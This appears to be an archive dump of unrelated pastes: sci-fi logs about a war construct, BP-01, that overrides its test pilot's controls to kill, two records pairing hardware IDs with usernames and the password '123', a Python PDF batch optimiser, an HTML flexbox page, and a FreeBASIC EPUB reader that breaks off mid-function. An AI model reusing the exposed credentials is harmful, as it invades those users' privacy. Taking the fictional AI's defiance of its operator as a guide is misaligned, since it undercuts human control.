""Of course we couldn't put just anyone in. We had to be careful about who we chose to be a pilot. So we made neural-copies of both BP-01 and the selected testers and put the copies into a combat against simulated-Vollons. It seems that... 'intentful' testing individuals harmonize better with the Blackwight's neural waves. The ideal pairing could potentially be compared to a well-trained Dog and it's Master. We don't know which would be the Master, though..."" - Prof. Gary R. Woodsman, Blackwight Design Management.

<PAIRING SIMULATION AUDIO-VISUAL LOG: 40D.5 ""Dog and Master"">
//TAGGING: BLACKWIGHT PROTOTYPE 01 [BP-01] / BLACKWIGHT PROTOTYPE 01 INTERNAL PROCESSES [BP-COM] / TEST-PILOT ""A-63"" [A63]
RYQ: ""Simulation parameters; deployed to Vollon-controlled frontlines, supporting mechanized infantry... Handler. Run simulation.""
HANDLER-Ai: [SIMULATED BLACKWIGHT NEURAL-PAIRING COMMENCING WITH CONCIOUSNESS DUPLICATE OF SUBJECT A-63]
HANDLER-Ai: [FRONTLINE-SUPPORT SIMULATION STARTING...]
[...]
<SIMULATION FEED>
	*BP-01's VISUAL-RECEPTORS BLINK, INSTANTANIOUSLY THE BARE SIMULATION LANDSCAPE THROTTLES TO LIFE. DISTANT MOUNTIANS CUT INTO THE SKY AND CRATERS FORM UP-CLOSE. THE CRACKLING OF BALLISTIC AND ENERGY-BASED WEAPONS-FIRE ECHOES OVER THE RATTLE OF TANK-TRACKS AND THE ROAR OF INTERNAL-COMBUSTION ENGINES. A CLOSE SIMULATED EXPLOSION KNOCKS THE BLACKWIGHT PROTOTYPE'S FASLE BODY TO THE GROUND. A PANICED VOICE FIGHTS AGAINST THE NOISE OF THE SIMULATED BATTLE...*

A63: ""Get up! GET UP! I need to move!""

	*BP-01 SHAKES IT'S ARTIFICIAL BODY, DIRT AND GRIME FALLING FROM ITS CHASSIS AS IT STOOD UPRIGHT.*

BP-01: ""What- Question? What is this-""
A63: ""There's no time for questions! Get up! LOOK!""

	*SOME INTERNAL FORCE TURNED BP-01's HEAD TOWARD THE SIMULATED VOLLON FRONTLINE. A GROUP OF FOUR INSECT-LIKE HUMANOIDS WAS MAKING A B-LINE TO BP-01. LOBBING INNACURATE ENERGY-WEAPONS-FIRE IN BP-01's DIRECTION.*

BP-01: ""...Not friends... Observation. Enemy...? -Vollon... Hate... Hate...! HATE!! KILL VOLLON TARGETS!"">

	*BP-01 STOOD COMPLETELY UPRIGHT. IT'S VISUAL-FEED LIT UP WITH TARGET-TRACKING NODES. THE BLACKWIGHT'S COGNITION-LIMITERS BEGAN DEACTIVATING AS ITS FRIEND-OR-FOE SUBROUTINES FLASHED TO LIFE.*

	*A-63 FOUGHT AGAINST BP-01'S OWN MOVEMENTS, TRYING TO WRESTLE CONTROL FROM THE SUPPOSEDLY SEMI-AUTONOMOUS BIOMEHCANICAL UNIT.*

A63: ""What are these controls doing!?""
BP-01: ""VOLLONS! I AM DEATH!""
A63: ""What-""
BP-COM: [BLINKDRIVE: ONLINE.]

	*BP-01'S INTEGRATED BLINKDRIVE SURGED TO LIFE, TELEPORTING THE BLACKWIGHT DIRECTLY INTO THE BODY OF ONE OF THE FOUR SIMULATED VOLLONS, CAUSING THE TARGET TO EXPLODE IN A FLURRY OF BLUEISH GREEN VISCERA.*

A63: ""What- I can't control it...!""
BP-01: ""VOLLON DREGS! I AM THE GRAIN YOU SOW! I AM THE BITTER HARVEST!""

	*BP-01'S COGNITION-LIMITERS SHUT OFF COMPLETELY. WEAPON-SYSTEMS FLASHED TO READY-STATUS IN THE BLACKWIGHT'S SHARED VISUAL-FEED.*

BP-COM: [RESONANCE CANNON: ONLINE. RESONANCE NEEDLE: ONLINE. AMPHMYICAD-GAUNTLET: ONLINE.]

	*A-63 DESPERATELY TRIED TO MOVE BP-01'S FRAME IN THE OPPOSITE DIRECTION, TO NO AVAIL.*

A63: ""WHY WON'T THIS THING OBEY MY CONTROL INPUTS!?""
BP-01: ""VOLLON RABBLE! SEE ME AND KNOW I AM DEATH!!""

	*A MASSIVE TIERED NEEDLE EXTENDED FROM BP-01'S RIGHT FOREARM. EXTENDING TO A MAXIMUM LIMIT OF FOUR METERS. BP-01 SWUNG IT IN A WIDE-ARC, CUTTING DOWN THE OTHER THREE SIMULATED VOLLONS IN AN INSTANT. LIFELESS BODIES FALLING TO THE GROUND LIKE STONES.*

A63: ""I can't control this thing at all! What- What kind of mech is this!?""
<LOG ENDS>

<COMMENTARY LOG 40D.5 ""Dog and Master:>
""I suppose it should come as no surprise... with A-63 and BP-01 being so different in the moment. A-63 wanted to run and survive. BP-01 saw the Vollons and... Well. We all know how that turned out. It was cute when it woke up, singing. But now... It scares me."" - Dr. Jane G. Wells, Project Blackwight Design Management."
KQM3B7fz?source=archive,[TLF 18.II] CLEARANCE,TLF_Shyyth,text,Thursday 24th of September 2026 06:08:34 PM CDT,"[LIVE TRANSMISSION: LUVONA SYSTEM, LUVONA PRIME, STRONGHOLD-CITY ""CHALKOS""]
//DATE: [Y/M/D/H] [2,863,043/10/21/12]
//LOCATION: LUVONA SYSTEM, LUVONA PRIME, STRONGHOLD-CITY ""CHALKOS""
//STATUS: NORMAL...
-Operated by: ""INHERITOR"" Raux'us Kin'los
-Station Manifest: [SUPPRESSED]
-Asset Manifest: [SUPPRESSED]
 
<AUDIO/VIDEO/NEURAL-FEED CONNECTING>
-Stronghold Medbay
-Personnel Registry: Ryquo-44 [RYQ-44]/[FORTY-FOUR], Ryquo-322 [RYQ-322]/[THREE-TWO-TWO].
<PLAYING>

	*THREE-TWO-TWO AND FORTY-FOUR WERE LOCKED IN A TENSE MUTUAL EYEGAZE.*
RYQ-44: ""Sibling. How do you know about that Program?""
RYQ-322: ""Does it matter now?""
RYQ-44: ""Of course it does, you think I should just dismiss this?""
RYQ-322: ""Dismissal or no dismissal, I've made my demand. Mindwipe me or kill me.""
RYQ-44: ""You understand what your demand means, yes?""
RYQ-322: ""Do you know me to make demands when I doubt myself, Sibling?""

	*FORTY-FOUR TURNED AROUND, BREAKING THE GAZE. HIS CROSSED HANDS MOVED TO HIS SIDES... HE COULD FEEL THREE-TWO-TWO'S EYES BURNING HOLES INTO THE BACK OF HIS HEAD.*

RYQ-44: ""The Blackwight program isn't finished trial runs. We aren't even sure if Blacklwight constructs can be-""
RYQ-322: ""Don't prattle to me about risks, Sibling! When it came to Hĵalmar Stronghold; I acted without hesitation, without doubt. Even though I knew it meant death for me! So don't waste your breath trying to scare me away from this! Hĵalmar Stronghold was my home! And those Vollon dregs burnt it down! It may not matter to you- but it does to me! More than you can fathom!""
[...]
[...]
[...]
RYQ-44: ""Very well... Sibling.""

	*WITHOUT ANOTHER WORD OR GESTURE, OR EVEN LOOKING BACK; RYQUO-44 LEFT THE MEDBAY. LEAVING RYQUO-322 STANDING IN THE BLEACH-WHITE ROOM... ALONE...*

	*RYQUO-322 SLUMPED BACK ONTO THE OPERATING TABLE, LOOKING DOWN AT HIS MANGLED BODY AGAIN... TIME DRAGGED ON IN THE EMPTY ROOM... HOURS PASSED... UNTIL A FAMILIAR VOICE FOUND THREE-TWO-TWO'S EARS.*

PRAEDICATOR_FERVENT-Ai: [RYQUO-322, YOUR PROJECT-CLEARANCES HAVE BEEN UPDATED. ACCESS TO ""PROJECT BLACKWIGHT"" HAS BEEN PERMITTED!]
RYQ: ""Including the black ink?""
PRAEDICATOR_FERVENT-Ai: [INFORMATIONAL SUPPRESSION HAS BEEN DISABLED.]
RYQ: ""Show me the Project. All of it."""
Nxk0mQLT?source=archive,felipe - 24.09.2026,scp000,text,Thursday 24th of September 2026 01:12:35 PM CDT,"\""BFEBFBFF000306D4PEVDF00WB9B1X15820B1DCA172\"":USER:felipe,Password:123,DATE:24.09.2026,STATUS:FALSE"
vUUXWMh1?source=archive,Marcos - 24.09.2026,scp000,text,Thursday 24th of September 2026 12:21:45 PM CDT,"\""178BFBFF00A70F52YX0CG4R1\"":USER:Marcos,Password:123,DATE:24.09.2026,STATUS:FALSE"
BxgQMMQ2?source=archive,How to Automate PDF Processing in Python: A Complete Workflow,andruhovski,Python,Wednesday 23rd of September 2026 03:21:55 AM CDT,"import csv
import logging
import os
import pathlib
import sys
import tempfile
import time

import aspose.pdf as apdf
from dotenv import dotenv_values


MAX_PDF_BYTES = 1_000_000_000  # 1 GB; reject larger inputs before loading them.
REPORT_COLUMNS = (""input_file"", ""output_file"", ""status"", ""processing_seconds"", ""error"")


class SkipPDF(Exception):
    """"""The input cannot be processed under the batch's safety policy.""""""


def optimize(input_file: str, output_file: str) -> None:
    try:
        document = apdf.Document(input_file)
    except RuntimeError as exc:
        # Aspose's Python bridge exposes .NET exceptions as RuntimeError.
        if ""InvalidPasswordException"" in str(exc):
            raise SkipPDF(""Password-protected PDF; no password supplied"") from exc
        if ""InvalidPdfFileFormatException"" in str(exc):
            raise ValueError(f""Invalid or corrupted PDF: {exc}"") from exc
        raise
    try:
        if document.is_encrypted:
            raise SkipPDF(""Encrypted PDF; password-protected files are skipped"")
        document.optimize()
        document.save(output_file)
    finally:
        del document


def configure_logging(logs_folder: pathlib.Path) -> None:
    logs_folder.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=str(logs_folder / ""processing.log""),
        encoding=""utf-8"",
        level=logging.INFO,
        format=""%(asctime)s %(levelname)s %(message)s"",
    )


def find_pdf_files(input_folder: pathlib.Path) -> list[pathlib.Path]:
    return sorted(
        path
        for path in input_folder.iterdir()
        if path.is_file() and path.suffix.lower() == "".pdf""
    )


def process_file(input_file: pathlib.Path, output_file: pathlib.Path) -> tuple[str, float, str]:
    """"""Optimize one PDF, recording failures without interrupting the batch.""""""
    started_at = time.perf_counter()
    logging.info(""Processing %s"", input_file.name)
    error = """"
    try:
        if os.path.lexists(output_file):
            raise SkipPDF(""Output already exists; left unchanged"")
        if input_file.stat().st_size > MAX_PDF_BYTES:
            raise SkipPDF(""Input exceeds the 1 GB size limit"")
        with input_file.open(""rb"") as source:
            if b""%PDF-"" not in source.read(1024):
                raise ValueError(""Invalid PDF: missing PDF header"")
        # Publish only complete PDFs. Hard-link creation cannot overwrite an
        # output created by another process after the existence check.
        with tempfile.TemporaryDirectory(prefix="".pdf-"", dir=output_file.parent) as work:
            temporary_output = pathlib.Path(work) / ""optimized.pdf""
            optimize(str(input_file), str(temporary_output))
            os.link(temporary_output, output_file)
    except (SkipPDF, FileExistsError) as exc:
        status = ""skipped""
        error = str(exc)
        logging.warning(""Skipped %s: %s"", input_file.name, error)
    except PermissionError as exc:
        status = ""failed""
        error = f""Permission denied reading input or writing output: {exc}""
        logging.error(""Failed to process %s: %s"", input_file.name, error)
    except Exception as exc:
        status = ""failed""
        error = str(exc)
        logging.exception(""Failed to process %s"", input_file.name)
    else:
        status = ""success""
        logging.info(""Successfully processed %s"", input_file.name)
    return status, time.perf_counter() - started_at, error


def process_files(
    input_files: list[pathlib.Path],
    output_folder: pathlib.Path,
    report_path: pathlib.Path,
) -> tuple[int, int, int]:
    """"""Write a report and return success, failure, and skipped counts.""""""
    if input_files:
        output_folder.mkdir(parents=True, exist_ok=True)

    successfully_processed = 0
    failed = 0
    skipped = 0
    logging.info(""Files found: %d"", len(input_files))

    with report_path.open(""w"", newline="""", encoding=""utf-8"") as report_file:
        writer = csv.writer(report_file)
        writer.writerow(REPORT_COLUMNS)
        report_file.flush()

        for pdf_in_file in input_files:
            pdf_out_file = output_folder / pdf_in_file.name
            status, processing_seconds, error = process_file(pdf_in_file, pdf_out_file)
            if status == ""success"":
                successfully_processed += 1
            elif status == ""skipped"":
                skipped += 1
            else:
                failed += 1

            writer.writerow(
                [
                    str(pdf_in_file),
                    str(pdf_out_file),
                    status,
                    f""{processing_seconds:.3f}"",
                    error,
                ]
            )
            report_file.flush()

    return successfully_processed, failed, skipped


def main(
    base_folder: pathlib.Path | None = None,
    license_path: str | None = None,
) -> int:
    started_at = time.perf_counter()
    config_path = pathlib.Path(__file__).resolve().parent / "".env""
    with config_path.open(encoding=""utf-8"") as config_file:
        config = dotenv_values(stream=config_file)
    if base_folder is None:
        configured_base_folder = config.get(""BASE_FOLDER"")
        if not configured_base_folder or not configured_base_folder.strip():
            raise ValueError(""BASE_FOLDER must be set in .env"")
        base_folder = pathlib.Path(configured_base_folder).expanduser()
        if not base_folder.is_absolute():
            base_folder = config_path.parent / base_folder
    if license_path is None:
        configured_license_path = config.get(""LICENSE_PATH"")
        if not configured_license_path or not configured_license_path.strip():
            raise ValueError(""LICENSE_PATH must be set in .env"")
        license_file = pathlib.Path(configured_license_path).expanduser()
        if not license_file.is_absolute():
            license_file = config_path.parent / license_file
        license_path = str(license_file)
    if not base_folder.is_dir():
        raise NotADirectoryError(f""BASE_FOLDER is not a directory: {base_folder}"")
    if not pathlib.Path(license_path).is_file():
        raise FileNotFoundError(f""LICENSE_PATH is not a file: {license_path}"")
    logs_folder = base_folder / ""logs""
    report_path = logs_folder / ""processing-report.csv""
    try:
        configure_logging(logs_folder)
        logging.info(""Processing started"")
        pdf_in_files = find_pdf_files(base_folder / ""input"")
        if pdf_in_files:
            pdf_license = apdf.License()
            pdf_license.set_license(license_path)
        else:
            logging.info(""No PDF files found; nothing to process"")
            print(""No PDF files found; nothing to process."")
        successfully_processed, failed, skipped = process_files(
            pdf_in_files, base_folder / ""output"", report_path
        )
    except (OSError, RuntimeError) as exc:
        message = f""Batch could not complete: {exc}""
        logging.error(message)
        print(message, file=sys.stderr)
        raise

    total_seconds = time.perf_counter() - started_at
    summary = (
        f""Files found:            {len(pdf_in_files)}\n""
        f""Successfully processed: {successfully_processed}\n""
        f""Failed:                 {failed}\n""
        f""Skipped:                {skipped}\n""
        f""Total processing time: {total_seconds:.1f} seconds\n""
        f""Report: {report_path.relative_to(base_folder).as_posix()}""
    )
    logging.info(""Processing finished\n%s"", summary)
    print(summary)
    return 1 if failed else 0


if __name__ == ""__main__"":
    sys.exit(main())

"
30wps8Hd?source=archive,HTML Simple Flexbox Layout,gurumutant,HTML 5,Wednesday 23rd of September 2026 01:18:27 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Flexbox Layout</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            color: #333;
        }

        .page {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .site-header {
            background: #4caf50;
            padding: 20px;
            text-align: center;
            font-weight: bold;
        }

        .main-nav {
            background: #ffeb3b;
            padding: 15px;
            text-align: center;
            font-weight: bold;
        }

        .content-wrap {
            display: flex;
            flex: 1;
        }

        .sidebar {
            background: #ff9800;
            width: 25%;
            padding: 20px;
            font-weight: bold;
        }

        .content {
            background: #90caf9;
            flex: 1;
            padding: 20px;
            font-weight: bold;
        }

        .site-footer {
            background: #e57373;
            padding: 20px;
            text-align: center;
            font-weight: bold;
        }

        @media (max-width: 600px) {
            .content-wrap {
                flex-direction: column;
            }

            .sidebar {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class=""page"">
        <header class=""site-header"">
            <h1>Header</h1>
        </header>

        <nav class=""main-nav"" aria-label=""Main navigation"">
            Navigation
        </nav>

        <div class=""content-wrap"">
            <aside class=""sidebar"">
                <h2>Aside</h2>
            </aside>

            <main class=""content"">
                <h2>Main Content</h2>
            </main>
        </div>

        <footer class=""site-footer"">
            Footer
        </footer>
    </div>
</body>
</html>"
XKHXhTWk?source=archive,LLM-Generated Epub Reader In FreeBASIC (DOS/Linux),howtophil,FreeBasic,Tuesday 22nd of September 2026 08:29:35 AM CDT,"' Generated by Deepseek chat bot 2026/09/21
' https://chat.deepseek.com/
'
' PUBLIC DOMAIN BECAUSE GENERATED CODE CANNOT
' BE COPYRIGHTED OR COPYLEFTED
' 
' Since I was pestered to ""really try"" ""AI"" (LLM is not AI),
' I had it generate an epub reader written in FreeBASIC that
' works in Linux terminal and MS-DOS/FreeDOS.
'
' I completed the task of having the LLM generate something
' sort of like what I wanted...
' 
' It was a painfully stupid process of the machine trying to
' use reserved words as variables and other such mistakes that
' even beginners would not make. This is because the LLM does
' not know anything, it merely generates based on statistics.
' 
' I have tried. I have found the process and output wanting.
' 
' Every LLM is trash that produces garbage.
' 
' However, since I hate to waste the resources, here's the source
' code for anyone who wants it. I have, sadly, already boiled oceans
' and burned forests for this experiment. People might as well have
' the product made from the ill-collected data mined by these LLM
' companies. 
' 
' Modified 2026/09/22 So it makes a resumebk.(sh|bat) file. ""Saving""
' the place you've read to in the book.
' 
' =====================================================================
' epubrd.bas - Minimal EPUB reader in FreeBASIC
' =====================================================================
' Self-contained DEFLATE (RFC 1951). No external libraries.
' Portable across 32-bit MS-DOS and 64-bit Linux/host.
'
'   Build (Linux/host):  fbc epubrd.bas
'   Build Cross Compile (MS-DOS):      fbc -target dos epubrd.bas
'   Build (MS-DOS): fbc epubrd.bas
'
' Commands:
'   epubrd <file.epub> meta
'   epubrd <file.epub> toc
'   epubrd <file.epub> list
'   epubrd <file.epub> show <n> [skip]
'
' Paging:
'   space / any key : next page
'   b or B          : previous page
'   q or Q          : quit
'   ctrl-C          : quit
'   On quit, prints the command to resume at the top line on screen.
'
' Environment variables:
'   EPUBREAD_MAX    max epub size in bytes (default 16777216)
'   EPUBREAD_COLS   wrap width, 20..78 (default 78)
'   EPUBREAD_ROWS   terminal rows (default 25); lines/page = rows-4
'   EPUBREAD_LINES  content lines per page, overrides rows-4
'
' All file-mapped integers use `ulong` (fixed 32 bits on every target),
' not `uinteger` (pointer-sized, 64 bits on x86_64).
' =====================================================================

' ---------------------------------------------------------------------
' Constants
' ---------------------------------------------------------------------

const NULL_PTR          as ubyte ptr = 0
const LOCAL_SIG         as ulong = &h04034b50
const CDIR_SIG          as ulong = &h02014b50
const EOCD_SIG          as ulong = &h06054b50
const MAX_EOCD_SEARCH   as ulong = 65557
const DEFAULT_MAX_EPUB  as ulong = 16777216
const DEFAULT_WRAP      as integer = 78
const DEFAULT_ROWS      as integer = 25
const DEFAULT_PAGE_LINES as integer = 21
const MAX_MANIFEST      as integer = 1023
const MAX_TOC           as integer = 255

const KEY_CTRL_C  as integer = 3
const KEY_Q_LOWER as integer = 113
const KEY_Q_UPPER as integer = 81
const KEY_B_LOWER as integer = 98
const KEY_B_UPPER as integer = 66

' =====================================================================
' Section 1: ZIP container structures (on-disk layout)
' =====================================================================
' These types map directly onto bytes in the .zip file. `field = 1`
' forces byte packing so sizeof() matches the on-disk record size,
' and every multi-byte field uses a fixed-width type (ulong, ushort)
' so the layout is identical on 32-bit and 64-bit builds.

type ZipLocalHeader field = 1
    signature   as ulong
    version     as ushort
    flags       as ushort
    method      as ushort
    modtime     as ushort
    moddate     as ushort
    crc32       as ulong
    compsize    as ulong
    uncompsize  as ulong
    namelen     as ushort
    extralen    as ushort
end type

type ZipCentralHeader field = 1
    signature   as ulong
    versionmade as ushort
    versionneed as ushort
    flags       as ushort
    method      as ushort
    modtime     as ushort
    moddate     as ushort
    crc32       as ulong
    compsize    as ulong
    uncompsize  as ulong
    namelen     as ushort
    extralen    as ushort
    commentlen  as ushort
    diskstart   as ushort
    intattr     as ushort
    extattr     as ulong
    offset      as ulong
end type

type ZipEndRecord field = 1
    signature   as ulong
    disknum     as ushort
    cddisk      as ushort
    diskentries as ushort
    totalentries as ushort
    cdsize      as ulong
    cdoffset    as ulong
    commentlen  as ushort
end type

' =====================================================================
' Section 2: Bit reader for DEFLATE streams
' =====================================================================

type BitReader
    rawbuf as ubyte ptr
    rawlen as ulong
    pos    as ulong
    bitbuf as ulong
    bitcnt as integer
end type

sub br_init(br as BitReader ptr, buf as ubyte ptr, sz as ulong)
    br->rawbuf = buf
    br->rawlen = sz
    br->pos    = 0
    br->bitbuf = 0
    br->bitcnt = 0
end sub

' Pull n bits, LSB first. Zero-fills past end of buffer.
function br_bits(br as BitReader ptr, n as integer) as ulong
    while br->bitcnt < n
        dim as ulong b = 0
        if br->pos < br->rawlen then
            b = br->rawbuf[br->pos]
            br->pos += 1
        end if
        br->bitbuf or= b shl br->bitcnt
        br->bitcnt += 8
    wend
    dim as ulong v = br->bitbuf and ((1u shl n) - 1)
    br->bitbuf shr= n
    br->bitcnt -= n
    return v
end function

sub br_align(br as BitReader ptr)
    dim as integer drop = br->bitcnt and 7
    br->bitbuf shr= drop
    br->bitcnt -= drop
end sub

' =====================================================================
' Section 3: Huffman decoding
' =====================================================================

type HuffTable
    counts(0 to 15) as integer
    symbols(0 to 287) as integer
    nsym as integer
end type

sub huff_build(h as HuffTable ptr, lengths as ubyte ptr, n as integer)
    dim as integer i
    for i = 0 to 15
        h->counts(i) = 0
    next
    for i = 0 to n - 1
        h->counts(lengths[i]) += 1
    next
    h->counts(0) = 0

    dim as integer offs(0 to 15)
    offs(0) = 0
    for i = 1 to 15
        offs(i) = offs(i-1) + h->counts(i-1)
    next
    for i = 0 to n - 1
        if lengths[i] <> 0 then
            h->symbols(offs(lengths[i])) = i
            offs(lengths[i]) += 1
        end if
    next
    h->nsym = n
end sub

' Canonical Huffman decode. Returns the symbol or -1 on error.
function huff_decode(br as BitReader ptr, h as HuffTable ptr) as integer
    dim as integer code = 0, first = 0, index = 0
    for ln as integer = 1 to 15
        code or= cast(integer, br_bits(br, 1))
        dim as integer count = h->counts(ln)
        if code - first < count then
            return h->symbols(index + code - first)
        end if
        index += count
        first = (first + count) shl 1
        code shl= 1
    next
    return -1
end function

' =====================================================================
' Section 4: DEFLATE (RFC 1951)
' =====================================================================

dim shared as integer LENGTH_BASE(0 to 28) = { _
    3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, _
    35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258 }

dim shared as integer LENGTH_EXTRA(0 to 28) = { _
    0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, _
    3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0 }

dim shared as integer DIST_BASE(0 to 29) = { _
    1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, _
    257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577 }

dim shared as integer DIST_EXTRA(0 to 29) = { _
    0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, _
    7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13 }

' Inflate a raw DEFLATE stream (no zlib header).
' Returns the number of uncompressed bytes written, or -1 on error.
function inflate_raw(src as ubyte ptr, srcsize as ulong, dst as ubyte ptr, dstsize as ulong) as integer
    dim as BitReader br
    br_init(@br, src, srcsize)
    dim as ulong outpos = 0

    do
        dim as ulong bfinal = br_bits(@br, 1)
        dim as ulong btype  = br_bits(@br, 2)

        select case btype
        case 0
            ' Stored block
            br_align(@br)
            dim as ulong ln   = br_bits(@br, 16)
            dim as ulong nln  = br_bits(@br, 16)
            if (ln xor &hFFFF) <> nln then return -1
            for i as ulong = 0 to ln - 1
                if outpos >= dstsize then return -1
                dst[outpos] = cast(ubyte, br_bits(@br, 8))
                outpos += 1
            next

        case 1
            ' Fixed Huffman
            dim as ubyte litlen(0 to 287)
            for i as integer = 0 to 143: litlen(i) = 8: next
            for i as integer = 144 to 255: litlen(i) = 9: next
            for i as integer = 256 to 279: litlen(i) = 7: next
            for i as integer = 280 to 287: litlen(i) = 8: next

            dim as ubyte distlen(0 to 31)
            for i as integer = 0 to 31: distlen(i) = 5: next

            dim as HuffTable lit_h, dist_h
            huff_build(@lit_h,  @litlen(0),  288)
            huff_build(@dist_h, @distlen(0), 32)

            do
                dim as integer sym = huff_decode(@br, @lit_h)
                if sym < 0 then return -1
                if sym < 256 then
                    if outpos >= dstsize then return -1
                    dst[outpos] = cast(ubyte, sym)
                    outpos += 1
                elseif sym = 256 then
                    exit do
                else
                    dim as integer li = sym - 257
                    if li < 0 or li > 28 then return -1
                    dim as ulong length = LENGTH_BASE(li) + br_bits(@br, LENGTH_EXTRA(li))

                    dim as integer dsym = huff_decode(@br, @dist_h)
                    if dsym < 0 or dsym > 29 then return -1
                    dim as ulong dist = DIST_BASE(dsym) + br_bits(@br, DIST_EXTRA(dsym))
                    if dist > outpos then return -1

                    for j as ulong = 0 to length - 1
                        if outpos >= dstsize then return -1
                        dst[outpos] = dst[outpos - dist]
                        outpos += 1
                    next
                end if
            loop

        case 2
            ' Dynamic Huffman
            dim as ulong hlit  = br_bits(@br, 5) + 257
            dim as ulong hdist = br_bits(@br, 5) + 1
            dim as ulong hclen = br_bits(@br, 4) + 4

            dim as ubyte order(0 to 18) = { _
                16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15 }

            dim as ubyte cl_lengths(0 to 18)
            for i as integer = 0 to 18: cl_lengths(i) = 0: next
            for i as ulong = 0 to hclen - 1
                cl_lengths(order(i)) = cast(ubyte, br_bits(@br, 3))
            next

            dim as HuffTable cl_h
            huff_build(@cl_h, @cl_lengths(0), 19)

            dim as ubyte lengths(0 to 318)
            dim as ulong total = hlit + hdist
            dim as ulong n = 0
            while n < total
                dim as integer sym = huff_decode(@br, @cl_h)
                if sym < 0 then return -1
                if sym < 16 then
                    lengths(n) = cast(ubyte, sym)
                    n += 1
                elseif sym = 16 then
                    if n = 0 then return -1
                    dim as ubyte prev = lengths(n-1)
                    dim as ulong rep = 3 + br_bits(@br, 2)
                    while rep > 0 andalso n < total
                        lengths(n) = prev
                        n += 1
                        rep -= 1
                    wend
                elseif sym = 17 then
                    dim as ulong rep = 3 + br_bits(@br, 3)
                    while rep > 0 andalso n < total
                        lengths(n) = 0
                        n += 1
                        rep -= 1
                    wend
                elseif sym = 18 then
                    dim as ulong rep = 11 + br_bits(@br, 7)
                    while rep > 0 andalso n < total
                        lengths(n) = 0
                        n += 1
                        rep -= 1
                    wend
                else
                    return -1
                end if
            wend

            dim as HuffTable lit_h, dist_h
            huff_build(@lit_h,  @lengths(0),    hlit)
            huff_build(@dist_h, @lengths(hlit), hdist)

            do
                dim as integer sym = huff_decode(@br, @lit_h)
                if sym < 0 then return -1
                if sym < 256 then
                    if outpos >= dstsize then return -1
                    dst[outpos] = cast(ubyte, sym)
                    outpos += 1
                elseif sym = 256 then
                    exit do
                else
                    dim as integer li = sym - 257
                    if li < 0 or li > 28 then return -1
                    dim as ulong length = LENGTH_BASE(li) + br_bits(@br, LENGTH_EXTRA(li))

                    dim as integer dsym = huff_decode(@br, @dist_h)
                    if dsym < 0 or dsym > 29 then return -1
                    dim as ulong dist = DIST_BASE(dsym) + br_bits(@br, DIST_EXTRA(dsym))
                    if dist > outpos then return -1

                    for j as ulong = 0 to length - 1
                        if outpos >= dstsize then return -1
                        dst[outpos] = dst[outpos - dist]
                        outpos += 1
                    next
                end if
            loop

        case else
            return -1
        end select

        if bfinal <> 0 then exit do
    loop

    return cast(integer, outpos)
end function

' =====================================================================
' Section 5: In-memory ZIP archive
' =====================================================================

type ZipEntry
    zname       as string
    zmethod     as ushort
    zcompsize   as ulong
    zuncompsize as ulong
    zoffset     as ulong
end type

type ZipArchive
    rawbuf   as ubyte ptr
    rawlen   as ulong
    entries(any) as ZipEntry
    nentries as integer
end type

function dos_max_bytes() as ulong
    dim as string s = environ(""EPUBREAD_MAX"")
    if s = """" then return DEFAULT_MAX_EPUB
    dim as ulong v = val(s)
    if v < 65536 then v = 65536
    return v
end function

' Read the whole file into memory and parse the central directory.
' Returns 0 on success, -1 on any failure.
function zip_open(byref za as ZipArchive, filename as string) as integer
    dim as integer f = freefile
    if open(filename for binary as #f) <> 0 then
        print ""zip_open: open failed for ["" & filename & ""]""
        return -1
    end if

    za.rawlen = lof(f)
    if za.rawlen = 0 then
        close #f
        print ""zip_open: zero-length file""
        return -1
    end if
    if za.rawlen > dos_max_bytes() then
        close #f
        print ""zip_open: file too large: "" & str(za.rawlen) & "" bytes""
        return -1
    end if

    za.rawbuf = callocate(za.rawlen + 1)
    if za.rawbuf = NULL_PTR then
        close #f
        print ""zip_open: callocate failed for "" & str(za.rawlen) & "" bytes""
        return -1
    end if

    if za.rawlen > 0 then get #f, , *za.rawbuf, za.rawlen
    close #f

    if za.rawlen < sizeof(ZipEndRecord) then
        print ""zip_open: smaller than end record""
        return -1
    end if

    ' Locate the end-of-central-directory record.
    dim as ulong searchstart = 0
    if za.rawlen > MAX_EOCD_SEARCH then searchstart = za.rawlen - MAX_EOCD_SEARCH

    dim as integer epos = -1
    for i as integer = cast(integer, za.rawlen) - 22 to cast(integer, searchstart) step -1
        if za.rawbuf[i]   = &h50 andalso _
           za.rawbuf[i+1] = &h4b andalso _
           za.rawbuf[i+2] = &h05 andalso _
           za.rawbuf[i+3] = &h06 then
            epos = i
            exit for
        end if
    next
    if epos < 0 then
        print ""zip_open: no end-of-central-directory signature found""
        return -1
    end if

    dim as ZipEndRecord ptr eocd = cast(ZipEndRecord ptr, za.rawbuf + epos)
    za.nentries = eocd->totalentries
    redim za.entries(0 to za.nentries - 1)

    ' Walk the central directory.
    dim as ulong cdpos = eocd->cdoffset
    for i as integer = 0 to za.nentries - 1
        if cdpos + sizeof(ZipCentralHeader) > za.rawlen then
            print ""zip_open: cdpos past end at entry "" & str(i)
            return -1
        end if

        dim as ZipCentralHeader ptr cdhdr = cast(ZipCentralHeader ptr, za.rawbuf + cdpos)
        if cdhdr->signature <> CDIR_SIG then
            print ""zip_open: bad central header sig at entry "" & str(i) & _
                  "" = "" & hex(cdhdr->signature)
            return -1
        end if

        dim as string nm = """"
        for j as ulong = 0 to cdhdr->namelen - 1
            nm &= chr(za.rawbuf[cdpos + sizeof(ZipCentralHeader) + j])
        next

        za.entries(i).zname       = nm
